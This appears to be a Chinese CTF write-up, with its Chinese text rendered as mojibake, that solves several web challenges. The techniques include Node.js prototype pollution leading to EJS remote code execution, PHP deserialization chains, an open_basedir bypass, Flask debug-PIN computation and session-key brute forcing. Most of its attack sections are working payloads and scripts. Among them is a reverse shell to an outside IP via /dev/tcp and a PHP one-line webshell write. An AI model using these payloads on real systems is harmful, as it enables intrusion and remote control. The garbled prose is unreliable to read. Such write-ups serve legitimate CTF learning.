ä¹Ÿæ²¡æœ‰æ¶‰åŠåˆ°å¯ä»¥è®©Super[â€˜userroleâ€™]çš„å€¼ä¸ºSuperadminçš„åœ°æ–¹ï¼Œä½†æ˜¯å‡­ç©ºå¤šå‡ºæ¥ä¸€ä¸ªcodeè·¯ç”±ï¼Œputil_mergeå‡½æ•°å’Œmergeå‡½æ•°ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šè¿™é‡Œæœ‰é—®é¢˜äº† 1234567app.all('/code', (req, res) =&gt; { res.type('html'); if (req.method == &quot;POST&quot; &amp;&amp; req.body) { putil_merge({}, req.body, {deep:true}); } res.send(&quot;welcome to code&quot;);}); ä¸Šç½‘æœç´¢putil_mergeå‡½æ•°ï¼Œå‘ç°ç¡®å®å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ 123456const putil_merge = require('putil-merge');const payload = JSON.parse('{&quot;constructor&quot;: {&quot;prototype&quot;: {&quot;polluted&quot;: &quot;yes&quot;}}}');let obj = {};console.log(&quot;Before:&quot; + {}.polluted)putil_merge(obj, payload, { deep: true });console.log(&quot;After:&quot; + {}.polluted) æ”¹æˆ è¦æ”¹æˆapplication/json 1GET :/code 1POST:{&quot;constructor&quot;: {&quot;prototype&quot;: {&quot;userrole&quot;: &quot;Superadmin&quot;}}} å°†Super[â€˜userroleâ€™]çš„å€¼æ”¹ä¸ºSuperadminï¼Œå°±æœ‰æƒé™æ‰§è¡Œï¼š 1res.render('index', req.body); è¿™é‡Œæ˜¯ä¸€ä¸ªcveï¼Œå¯ä»¥å‚è€ƒè¿™ä½å¤§ä½¬ å½±å“ç‰ˆæœ¬ï¼šejs &lt;= v3.1.9 ï¼ˆæœ€æ–°ç‰ˆæœ¬ 123456789{&quot;name&quot;:&quot;abc&quot;, &quot;settings&quot;:{ &quot;view options&quot;:{ &quot;escapeFunction&quot;:&quot;console.log;this.global.process.mainModule.require('child_process').execSync(\\&quot;bash -c 'bash -i &gt;&amp; /dev/tcp/81.71.13.76/5050 0&gt;&amp;1'\\&quot;);&quot;, &quot;client&quot;:&quot;true&quot; } }} ez_remove1234567891011121314151617181920212223&lt;?phphighlight_file(__FILE__);class syc{ public $lover; public function __destruct() { echo $this-&gt;lover; echo &quot;daozhel&quot;; eval($this-&gt;lover); }}if(isset($_GET['web'])){ if(!preg_match('/lover/i',$_GET['web'])){ $a=unserialize($_GET['web']); throw new Error(&quot;å¿«æ¥ç©å¿«æ¥ç©~&quot;); } else{ echo(&quot;nonono&quot;); }}?&gt; åˆ©ç”¨åå…­è¿›åˆ¶è¦ç»•è¿‡æ­£åˆ™åŒ¹é… 1lover ==&gt; \\6cover åˆ©ç”¨gcå›æ”¶ç»•è¿‡å¼‚å¸¸ 1O:3:&quot;syc&quot;:1 ==&gt; O:3:&quot;syc&quot;:2 å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯è¦å°†å°å†™sè½¬å˜å¤§å†™S ,æ‰èƒ½è§£æåå…­è¿›åˆ¶ 1?web=O:3:&quot;syc&quot;:2:{S:5:&quot;\\6cover&quot;;s:53:&quot;file_put_contents('2.php','&lt;?php @eval($_POST[1]);');&quot;;} å†™å…¥æœ¨é©¬ ï¼Œå‘ç°æ— æ³•æ­£å¸¸æ‰§è¡Œshellå‘½ä»¤ï¼Œè¯»å–phpinfoæŸ¥çœ‹disable_functions å‘ç°ç¦ç”¨äº†å‡½æ•°system,exec,shell_exec,fopen,pcmtl_exe,passthru,popen è¿˜æœ‰open_basedir: /var/www/html/ ç»•è¿‡open_basedir: ini_setç”¨æ¥è®¾ç½®php.iniçš„å€¼ï¼Œæ— éœ€æ‰“å¼€php.iniæ–‡ä»¶ï¼Œå°±èƒ½ä¿®æ”¹é…ç½® 1mkdir('test');chdir('test');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');show_source(&quot;f1ger&quot;); ez_path(os.path.join)pycåœ¨çº¿åæ±‡ç¼– 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778# uncompyle6 version 3.8.0# Python bytecode 3.6 (3379)# Decompiled from: Python 3.7.0 (default, Nov 25 2022, 11:07:23) # [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]# Embedded file name: ./tempdata/96e9aea5-79fb-4a2f-a6b9-d4f3bbf3c906.py# Compiled at: 2023-08-26 01:33:29# Size of source mod 2**32: 2076 bytesimport os, uuidfrom flask import Flask, render_template, request, redirectapp = Flask(__name__)ARTICLES_FOLDER = 'articles/'articles = []class Article: def __init__(self, article_id, title, content): self.article_id = article_id self.title = title self.content = contentdef generate_article_id(): return str(uuid.uuid4())@app.route('/')def index(): return render_template('index.html', articles=articles)@app.route('/upload', methods=['GET', 'POST'])def upload(): if request.method == 'POST': title = request.form['title'] content = request.form['content'] article_id = generate_article_id() article = Article(article_id, title, content) articles.append(article) save_article(article_id, title, content) return redirect('/') else: return render_template('upload.html')@app.route('/article/&lt;article_id&gt;')def article(article_id): for article in articles: if article.article_id == article_id: title = article.title sanitized_title = sanitize_filename(title) article_path = os.path.join(ARTICLES_FOLDER, sanitized_title) with open(article_path, 'r') as (file): content = file.read() return render_template('articles.html', title=sanitized_title, content=content, article_path=article_path) return render_template('error.html')def save_article(article_id, title, content): sanitized_title = sanitize_filename(title) article_path = ARTICLES_FOLDER + '/' + sanitized_title with open(article_path, 'w') as (file): file.write(content)def sanitize_filename(filename): sensitive_chars = [ ':', '*', '?', '&quot;', '&lt;', '&gt;', '|', '.'] for char in sensitive_chars: filename = filename.replace(char, '_') return filenameif __name__ == '__main__': app.run(debug=True)# okay decompiling /tmp/65448aefd10b0.pyc ä»£ç æ¯”è¾ƒç®€å•ï¼Œå°±ä¸€ä¸ªå†™å’Œçœ‹çš„åŠŸèƒ½ æ¼æ´ç‚¹åœ¨ï¼šos.path.joinå‡½æ•°æ²¡æœ‰å¯¹è·¯å¾„åšå¾ˆå¥½çš„å¤„ç†ï¼Œå°†æœ€åä¸€ä¸ªåæ–œæ çœ‹ä½œè·¯å¾„çš„å¼€å¤´ï¼Œæ‰€ä»¥å¯ä»¥ä»»æ„æ–‡ä»¶æ³„éœ² ç„¶åå‘ç°debug=Trueï¼Œé‚£æ€è·¯å°±å¾ˆæ˜æ˜¾äº†ï¼Œé€šè¿‡os.path.joinå‡½æ•°æ³„éœ²æ–‡ä»¶è®¡ç®—pinç  123456789101112131415161718192021222324252627282930313233343536373839404142434445# sha1import hashlibfrom itertools import chainprobably_public_bits = [ 'root' # /etc/passwd 'flask.app', # é»˜è®¤å€¼ 'Flask', # é»˜è®¤å€¼ '/usr/local/lib/python3.9/site-packages/flask/app.py' # æŠ¥é”™å¾—åˆ°]private_bits = [ '37782193255385', # /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶ '31e70710-1d09-4cda-bc57-a7a012a89ef7docker-8037c9ea09717214042823e30fbac73b8ffa9c2671fad321c717e11489690a6b.scope' # /proc/self/cgroup]h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv = Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) you konw flask?robots.txtæ³„éœ²äº†3ysd8.html è®¿é—®3ysd8.htmlå¾—åˆ°ï¼š 1&lt;!-- keyæ˜¯ app.secret_key = 'wanbao'+base64.b64encode(str(random.randint(1, 100)).encode('utf-8')).decode('utf-8')+'wanbao' (www,æˆ‘å¯çˆ±çš„è€å®,æˆ‘å­˜çš„å¤Ÿå®‰å…¨çš„å§) --&gt; 1234567import base64with open(&quot;dict.txt&quot;, &quot;w&quot;) as fp: for i in range(1, 100): original_string =str(i) byte_data = original_string.encode('utf-8') encoded_data = base64.b64encode(byte_data).decode('utf-8') fp.write('&quot;wanbao'+encoded_data + 'wanbao&quot;\\n') 12345PS D:\\Project&gt; flask-unsign --unsign --cookie &quot;eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiJ0ZXN0IiwidXNlcl9pZCI6Mn0.ZUoT_Q.rZAY3c8K33S38x_AydOHdOh4ozQ&quot; --wordlist ./test/ctf_web/dict.txt[*] Session decodes to: {'is_admin': False, 'name': 'test', 'user_id': 2}[*] Starting brute-forcer with 8 threads..[+] Found secret key after 99 attempts'wanbaoMzU=wanbao' 12python3 flask_session_cookie_manager3.py encode -s &quot;wanbaoMzU=wanbao&quot; -t &quot;{'is_admin': True, 'name': 'admin', 'user_id': 1}&quot; #eyJpc19hZG1pbiI6dHJ1ZSwibmFtZSI6ImFkbWluIiwidXNlcl9pZCI6MX0.ZUoU3g.xvaYWmDWnhze2kXQpN0BTWOBuqY Pupyy_rce(æ— å‚RCE)1print_r(scandir(current(localeconv()))); flag.phpæ–‡ä»¶åœ¨ä¸­é—´ï¼Œä¸èƒ½åƒå¹³å¸¸ä¸€æ · é€šè¿‡unlinkä½¿å¾—flag.phpæ˜¯å€’æ•°ç¬¬äºŒä¸ªæ–‡ä»¶åœ¨è¯»å–å°±okäº† 1234unlink(end(scandir(current(localeconv()))));unlink(end(scandir(current(localeconv()))));unlink(next(array_reverse(scandir(current(localeconv())))));show_source(next(array_reverse(scandir(current(localeconv()))))); è¡¥å……ï¼š æœ‰å‡ ç‡å¯ä»¥æŸ¥çœ‹æ ¹ç›®å½•ï¼Œstrrev(crypt(serialize(array())))æ‰€è·å¾—çš„å­—ç¬¦ä¸²ç¬¬ä¸€ä½æœ‰å‡ ç‡æ˜¯/ 1print_r(scandir(chr(ord(strrev(crypt(serialize(array()))))))); å‚è€ƒ ez_phpæºç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;); error_reporting(0);show_source(__FILE__);include('key.php');include('waf.php');class Me { public $qwe; public $bro; public $secret; public function __wakeup() { echo(&quot;è¿›æ¥å•¦&lt;br&gt;&quot;); $characters = 'abcdefghijklmnopqrstuvwxyz0123456789'; $randomString = substr(str_shuffle($characters), 0, 6); $this-&gt;secret=$randomString; if($this-&gt;bro===$this-&gt;secret){ $bb = $this-&gt;qwe; return $bb(); } else{ echo(&quot;é”™äº†å“¥ä»¬,å†è¯•è¯•å§&lt;br&gt;&quot;); } }}class her{ private $hername; private $key; public $asd; public function __invoke() { echo(&quot;å¥½ç´¯ï¼Œå¥½æƒ³ç¡ä¸€è§‰å•Š&lt;br&gt;&quot;); serialize($this-&gt;asd); } public function find() { echo(&quot;ä½ èƒ½æ‰¾åˆ°åŠ å¯†ç”¨çš„keyå’Œå¥¹çš„åå­—å—ï¼Ÿqwq&lt;br&gt;&quot;); if (encode($this-&gt;hername,$this-&gt;key) === 'vxvx') { echo(&quot;è§£å¯†æˆåŠŸï¼&lt;br&gt;&quot;); $file=$_GET['file']; if (isset($file) &amp;&amp; (file_get_contents($file,'r') === &quot;loveyou&quot;)) { echo(&quot;å¿«ç‚¹çš„ï¼Œæ€¥æ€¥æ€¥ï¼ï¼ï¼&lt;br&gt;&quot;); echo new $_POST['ctf']($_GET['fun']); } else{ echo(&quot;çœŸçš„åªå·®ä¸€æ­¥äº†ï¼&lt;br&gt;&quot;); } } else{ echo(&quot;å…„å¼Ÿæ€ä¹ˆæçš„ï¼Ÿ&lt;br&gt;&quot;); } }}class important{ public $power; public function __sleep() { echo(&quot;ç¡é¥±äº†ï¼Œæ¥ç€æ‰¾ï¼&lt;br&gt;&quot;); return $this-&gt;power-&gt;seeyou; }}class useless { private $seeyou; public $QW; public $YXX; public function __construct($seeyou) { $this-&gt;seeyou = $seeyou; } public function __destruct() { $characters = '0123456789'; $random = substr(str_shuffle($characters), 0, 6); if (!preg_match('/key\\.php\\/*$/i', $_SERVER['REQUEST_URI'])){ if((strlen($this-&gt;QW))&lt;80 &amp;&amp; strlen($this-&gt;YXX)&lt;80){ $bool=!is_array($this-&gt;QW)&amp;&amp;!is_array($this-&gt;YXX)&amp;&amp;(md5($this-&gt;QW) === md5($this-&gt;YXX)) &amp;&amp; ($this-&gt;QW != $this-&gt;YXX) and $random==='newbee'; if($bool){ echo(&quot;å¿«æ‹¿åˆ°æˆ‘çš„å°ç§˜å¯†äº†&lt;br&gt;&quot;); $a = isset($_GET['a'])? $_GET['a']: &quot;&quot; ; if(!preg_match('/HTTP/i', $a)){ echo (basename($_SERVER[$a])); echo ('&lt;br&gt;'); if(basename($_SERVER[$a])==='key.php'){ echo(&quot;æ‰¾åˆ°äº†ï¼ä½†å¥½åƒä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œæ€ä¹ˆåŠï¼Œæˆ‘å¥½æƒ³å¥¹&lt;br&gt;&quot;); $file = &quot;key.php&quot;; readfile($file); } } else{ echo(&quot;ä½ åˆ«è¿™æ ·ï¼Œå¥¹ä¼šç”Ÿæ°”çš„â”­â”®ï¹â”­â”®&quot;); } } } else{ echo(&quot;å°±è¿™ç‚¹èƒ½è€ï¼Ÿæ€ä¹ˆå¸®æˆ‘æ‰¾åˆ°å¥¹(â•¥â•¯^â•°â•¥)&lt;br&gt;&quot;); } } } public function __get($good) { echo &quot;you are good,ä½ å¿«æ‰¾åˆ°æˆ‘çˆ±çš„é‚£ä¸ªå¥¹äº†&lt;br&gt;&quot;; $zhui = $this-&gt;$good; $zhui[$good](); }}if (isset($_GET['user'])) { $user = $_GET['user']; if (!preg_match(&quot;/^[Oa]:[\\d]+/i&quot;, $user)) { unserialize($user); } else { echo(&quot;ä¸æ˜¯å§ï¼Œç¬¬ä¸€å±‚éƒ½ç»•ä¸è¿‡å»ï¼Ÿï¼Ÿï¼Ÿ&lt;br&gt;&quot;); }}else { echo(&quot;å¿«å¸®æˆ‘æ‰¾æ‰¾å¥¹ï¼&lt;br&gt;&quot;);}?&gt; è™½ç„¶ä»£ç çœ‹èµ·æ¥æ¯”è¾ƒé•¿ï¼Œä½†æ˜¯è¿˜æ˜¯æ¯”è¾ƒå¥½åˆ†æçš„ï¼Œpopé“¾ä¹Ÿå¾ˆå®¹æ˜“çœ‹å‡ºæ¥ã€‚éœ€è¦ç”¨åˆ°ä¸¤æ¬¡popé“¾ï¼Œç¬¬ä¸€æ¡ç”¨æ¥å¾—åˆ°key.phpçš„å†…å®¹ï¼Œç¬¬äºŒæ¬¡æ‰æ˜¯å¾—åˆ°flag 123unserialize -&gt; useless(__destruct) -&gt; useless(readfile)unserialize -&gt; Me(__wakeup) -&gt;her(__invoke) -&gt;important(__sleep) -&gt;useless(__get) -&gt;her(find) /^[Oa]:[\\d]+/iç¬¬ä¸€æ¬¡é‡åˆ°è¿™ç§æƒ…å†µï¼Œå•ç‹¬æ‹¿å‡ºæ¥è®²ä¸€ä¸‹ï¼š æŒºæ—©ä¹‹å‰æˆ‘å°±çŸ¥é“ä½¿ç”¨Cä»£æ›¿Oèƒ½ç»•è¿‡wakeupï¼Œä½†é‚£æ ·çš„è¯åªèƒ½æ‰§è¡Œconstruct()å‡½æ•°æˆ–è€…destruct()å‡½æ•°ï¼Œæ— æ³•æ·»åŠ ä»»ä½•å†…å®¹ï¼Œè¿™æ¬¡æ¯”èµ›å­¦åˆ°äº†ç§æ–°æ–¹æ³•ï¼Œå°±æ˜¯æŠŠæ­£å¸¸çš„ååºåˆ—åŒ–è¿›è¡Œä¸€æ¬¡æ‰“åŒ…ï¼Œè®©æœ€åç”Ÿæˆçš„payloadä»¥Cå¼€å¤´å³å¯ 12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow{ public function __wakeup(){ die(&quot;not allowed!&quot;); } public function __destruct(){ system($this-&gt;ctfshow); }}$data = $_GET['1+1&gt;2'];if(!preg_match(&quot;/^[Oa]:[\\d]+/i&quot;, $data)){ unserialize($data);}?&gt; ä¸èƒ½ç›´æ¥å°†å­—æ¯Oæ”¹æˆå­—æ¯C,è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ArrayObjectå¯¹æ­£å¸¸çš„ååºåˆ—åŒ–è¿›è¡Œä¸€æ¬¡åŒ…è£…ï¼Œè®©æœ€åè¾“å‡ºçš„payloadä»¥Cå¼€å¤´ 12345678910111213141516171819202122232425&lt;?phpclass ctfshow { public $ctfshow; public function __wakeup(){ die(&quot;not allowed!&quot;); } public function __destruct(){ echo &quot;OK&quot;; system($this-&gt;ctfshow); } }$a=new ctfshow;$a-&gt;ctfshow=&quot;whoami&quot;;$arr=array(&quot;evil&quot;=&gt;$a);$oa=new ArrayObject($arr);$res=serialize($oa);echo $res;//unserialize($res)?&gt;#C:11:&quot;ArrayObject&quot;:77:{x:i:0;a:1:{s:4:&quot;evil&quot;;O:7:&quot;ctfshow&quot;:1:{s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;}};m:a:0:{}} 7.3.4æ‰å¯ä»¥è¾“å‡ºä»¥Cå¼€å¤´çš„payloadï¼Œæ¢7.4æˆ–è€…8.0è¾“å‡ºçš„å°±æ˜¯Oå¼€å¤´äº†ï¼Œé™¤äº†è¿™ä¸ªå‡½æ•°è¿˜æœ‰å…¶ä»–æ–¹æ³•å¯ä»¥å¯¹payloadè¿›è¡ŒåŒ…è£… å®ç°äº†unserializeæ¥å£çš„å¤§æ¦‚ç‡æ˜¯Cæ‰“å¤´ï¼Œç»è¿‡æ‰€æœ‰æµ‹è¯•å‘ç°å¯ä»¥ç”¨çš„ç±»ä¸ºï¼š ArrayObject::unserialize ArrayIterator::unserialize RecursiveArrayIterator::unserialize SplObjectStorage::unserialize å‚è€ƒ pop_onestr_shuffleï¼šéšæœºåœ°æ‰“ä¹±å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰å­—ç¬¦ ç”¨åŸç”Ÿç±»ç»•è¿‡md5,andçš„ä¼˜å…ˆçº§è¦ä½äº=ï¼Œbasenameç”¨asciiç¼–ç å¤§äº127ç»•è¿‡ï¼Œ$_SERVERæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå¯ä»¥è‡ªå·±æ‰“å°çœ‹çœ‹ 12345678910111213141516&lt;?phpclass useless{ public $QW; public $YXX;} $cmd=&quot;1&quot;;$a = new Exception($cmd);$b = new Exception($cmd,1);$tr = new useless();$tr-&gt;QW=$a;$tr-&gt;YXX=$b;$arr=array(&quot;evil&quot;=&gt;$tr);$oa=new ArrayObject($arr);echo urlencode(serialize(($oa)));#https://x64n15yejrv1auhzo7nkm4zct.node.game.sycsec.com/havefun.php/key.php/%ff?user=C%3A11%3A%22ArrayObject%22%3A473%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A4%3A%22evil%22%3BO%3A7%3A%22useless%22%3A2%3A%7Bs%3A2%3A%22QW%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A1%3A%221%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A8%3A%22E%3A%5Ca.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A9%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7Ds%3A3%3A%22YXX%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A1%3A%221%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A8%3A%22E%3A%5Ca.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A9%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D&amp;a=PHP_SELF æœ€ç»ˆå¾—åˆ°ä¸€æ®µåŠ å¯†çš„æ•°æ®ï¼Œå¤ªé•¿äº†æˆ‘å°±ä¸è´´äº†ï¼Œå°†æ•°æ®base64è§£å¯†ä¿å­˜æˆå›¾ç‰‡,å¾—åˆ°keyå’Œhername cyberchef pop_two12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpclass Me { public $qwe; public $bro; public $secret;}class her{ public $hername; public $key; public $asd;}class important{ public $power;}class useless { public $seeyou ; public $QW; public $YXX;}$a = new Me();$a-&gt;bro = &amp;$a-&gt;secret;$b = new her();$a-&gt;qwe = $b;$c = new important();$d = new useless('deadbeef');// $d-&gt;good=array(&quot;seeyou&quot;=&gt;&quot;phpinfo&quot;) ;$cc = new her();$cc-&gt;key=9;$cc-&gt;hername=&quot;momo&quot;;$method = [$cc, 'find'];$d-&gt;seeyou= array(&quot;seeyou&quot;=&gt;$method) ;$c-&gt;power = $d;$b -&gt;asd = $c;$arr=array(&quot;evil&quot;=&gt;$a);$oa=new ArrayObject($arr);echo (serialize(($oa)));?&gt; #C:11:&quot;ArrayObject&quot;:345:{x:i:0;a:1:{s:4:&quot;evil&quot;;O:2:&quot;Me&quot;:3:{s:3:&quot;qwe&quot;;O:3:&quot;her&quot;:3:{s:7:&quot;hername&quot;;N;s:3:&quot;key&quot;;N;s:3:&quot;asd&quot;;O:9:&quot;important&quot;:1:{s:5:&quot;power&quot;;O:7:&quot;useless&quot;:4:{s:6:&quot;seeyou&quot;;a:1:{s:6:&quot;seeyou&quot;;a:2:{i:0;O:3:&quot;her&quot;:3:{s:7:&quot;hername&quot;;s:4:&quot;momo&quot;;s:3:&quot;key&quot;;i:9;s:3:&quot;asd&quot;;N;}i:1;s:4:&quot;find&quot;;}}s:2:&quot;QW&quot;;N;s:3:&quot;YXX&quot;;N;s:4:&quot;good&quot;;N;}}}s:3:&quot;bro&quot;;N;s:6:&quot;secret&quot;;R:20;}};m:a:0:{}} è¿™æ¡popé“¾è¸©äº†å‘ï¼Œç¬¬ä¸€å°±æ˜¯ï¼Œå¯¹è±¡é‡Œåªå†™å±æ€§å€¼ï¼Œä¸è¦å†å†™å…¶ä»–çš„ä¸ç„¶ä¼šæœ‰å½±å“ï¼› __sleep: è¯¥å‡½æ•°å¿…é¡»è¿”å›ä¸€ä¸ªéœ€è¦è¿›è¡Œåºåˆ—åŒ–ä¿å­˜çš„æˆå‘˜å±æ€§æ•°ç»„ //å¹¶ä¸”åªåºåˆ—åŒ–è¯¥å‡½æ•°è¿”å›çš„è¿™äº›æˆå‘˜å±æ€§ __get: è·å¾—ä¸€ä¸ªç±»ä¸­ä¸å¯è®¿é—®çš„æˆå‘˜å˜é‡æ—¶(æœªå®šä¹‰æˆ–ç§æœ‰å±æ€§) åœ¨PHPä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨å¯è°ƒç”¨çš„æ•°ç»„æ¥å°†å¯¹è±¡çš„æ–¹æ³•èµ‹å€¼ç»™å˜é‡ã€‚è¿™å¯ä»¥é€šè¿‡å°†å¯¹è±¡å’Œæ–¹æ³•åä½œä¸ºæ•°ç»„çš„å…ƒç´ æ¥å®ç°ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼š 12345678910111213class MyClass { public function myMethod() { echo &quot;Hello, world!&quot;; }}$obj = new MyClass();$func = [$obj, 'myMethod'];// ç°åœ¨ $func å˜é‡åŒ…å«äº† MyClass å¯¹è±¡çš„ myMethod æ–¹æ³•// è°ƒç”¨è¯¥æ–¹æ³•$func(); è¿™æ¡é“¾æœ‰æ„æ€ï¼Œä½¿å¾—å°†herå¯¹è±¡çš„findå‡½æ•°èµ‹å€¼ç»™uselesså¯¹è±¡çš„seeyouå˜é‡ï¼Œç„¶å$this-&gt;goodä¸ç”¨ç®¡ï¼Œ$this-&gt;goodä¸ºç©ºï¼Œä¼šæ‰§è¡Œ$good().$goodæ˜¯ç”±importantå¯¹è±¡ä¼ è¿‡æ¥çš„seeyou,è€Œseeyouå·²ç»è¢«èµ‹å€¼ä¸ºäº†herå¯¹è±¡çš„findå‡½æ•°ï¼Œå°±ä¼šå»æ‰§è¡Œfindå‡½æ•°ï¼Œ å†ç”¨dataåè®®ç»•è¿‡ï¼Œ 1file=data:text/plain;base64,bG92ZXlvdQ== å†ç”¨åŸç”Ÿç±»ç»•è¿‡ï¼Œè¿™é“é¢˜ç”¨äº†ä¸¤æ¬¡phpåŸç”Ÿç±»ã€‚ GlobIteratorå¾—åˆ°flagçš„æ–‡ä»¶åå’Œè·¯å¾„.SplFileObjectè¯»æ–‡ä»¶ï¼Œåªèƒ½è¯»å–æ–‡ä»¶çš„ç¬¬ä¸€è¡Œå†…å®¹ï¼Œé…åˆphp://filteræ‹¿åˆ°æ–‡ä»¶æ‰€æœ‰å†…å®¹ 1234567GET :fun=./f*POST: ctf=GlobIterator#flag_my_baby.phpGET:fun=php://filter/read=convert.base64-encode/resource=flag_my_baby.phpPOST :ctf=SplFileObject Akane!source code12345678910111213141516171819202122232425262728293031323334353637&lt;?phperror_reporting(0);show_source(__FILE__);class Hoshino{ public $Ruby; private $Aquamarine; public function __destruct() { $this-&gt;Ruby-&gt;func(); }}class Idol{ public $Akane; public function __wakeup() { $this-&gt;Akane = '/var/www/html/The************************.php'; } public function __call($method,$args) { $Kana = count(scandir($this-&gt;Akane)); if ($Kana &gt; 0) { die('Kurokawa Akane'); } else { die('Arima Kana'); } }}$a = unserialize(base64_decode($_GET['tuizi']));?&gt; è€ƒçš„åºåˆ—åŒ–ï¼Œpopé“¾ä¹Ÿè¶³å¤Ÿæ˜æ˜¾ :, 1Hoshino(__destruct) -&gt; Idol(__call) ä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°ä»»ä½•å¯ä»¥å‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹ï¼Œç„¶åæˆ‘å°±å»dirsearch ï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•ä¸œè¥¿ï¼› å†ä»”ç»†åˆ†ææºç ï¼Œpopé“¾è‚¯å®šæ˜¯å›ºå®šçš„è¿™ä¸€ç‚¹ä¸ç”¨æƒ³ï¼Œåˆ†æåˆ†æ__callåˆ°åº•åœ¨å¹²ä»€ä¹ˆï¼Ÿ scandiråˆ—å‡º $this-&gt;Akane ç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•,è¿”å›çš„æ˜¯ä¸€ä¸ªæ•°ç»„ count è¿”å›æ•°ç»„ä¸­å…ƒç´ çš„æ•°ç›® glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ Example12345678&lt;?phperror_reporting(0);highlight_file(__FILE__);echo &quot;&lt;/br&gt;&quot;;echo count(scandir($_GET['file']));echo &quot;&lt;/br&gt;&quot;;var_dump(scandir($_GET['file']))?&gt; 12345http://127.0.0.1/test002.php?file=glob://f*#è¾“å‡ºå¦‚ä¸‹ï¼š2array(2) { [0]=&gt; string(4) &quot;flag&quot; [1]=&gt; string(8) &quot;flag.php&quot; } exp12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsimport base64base_url =&quot;https://jn5lthd6e8wksjfi6mpuosppa.node.game.sycsec.com/?tuizi=&quot;str = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&quot;def base64_encode(string): # å°†å­—ç¬¦ä¸²ç¼–ç ä¸º bytes å¯¹è±¡ string_bytes = string.encode('utf-8') # ä½¿ç”¨ base64 æ¨¡å—è¿›è¡Œç¼–ç  encoded_bytes = base64.b64encode(string_bytes) # å°†ç¼–ç åçš„ bytes å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸² encoded_string = encoded_bytes.decode('utf-8') return encoded_stringzifu = &quot;&quot;for i in range(100): k = i+30 data = f'O:7:&quot;Hoshino&quot;:2:{{s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:{{s:5:&quot;Akane&quot;;s:{k}:&quot;glob:///var/www/html/The*.php&quot;;}}s:19:&quot;HoshinoAquamarine&quot;;N;}}' zz = &quot;glob:///var/www/html/The&quot; +zifu +&quot;*.php&quot; if (len(zz) != k-1): break for j in range(len(str)): insert_string = zifu+str[j] print(zifu) start_index = data.find(&quot;The&quot;+zifu) insert_index = data.find(&quot;*.php&quot;) if insert_index != -1: # åœ¨æ‰¾åˆ°çš„ä½ç½®ä¹‹å‰æ’å…¥å­—ç¬¦ä¸² modified_string = data[:insert_index] + insert_string + data[insert_index:] base_data = base64_encode(modified_string) url= base_url+base_data res = requests.get(url=url) if (len(res.text) ==4120): print(&quot;success&quot;) zifu=zifu +str[j] print(zifu) #print(url) break else: print(&quot;æœªæ‰¾åˆ°æ’å…¥ä½ç½®&quot;)print(&quot;å­—ç¬¦:&quot;+zifu)#å­—ç¬¦:S4crEtF1AgFi1EByo2takuXX è®¿é—®TheS4crEtF1AgFi1EByo2takuXX.phpå¾—åˆ°flag klf_3source codeå†æ¯”èµ›ä¸­æ˜¯çœ‹ä¸åˆ°æºç çš„ï¼Œæ˜¯æˆ‘åæ¥å¯ä»¥rceåï¼Œcat app.pyå¾—åˆ°æºç 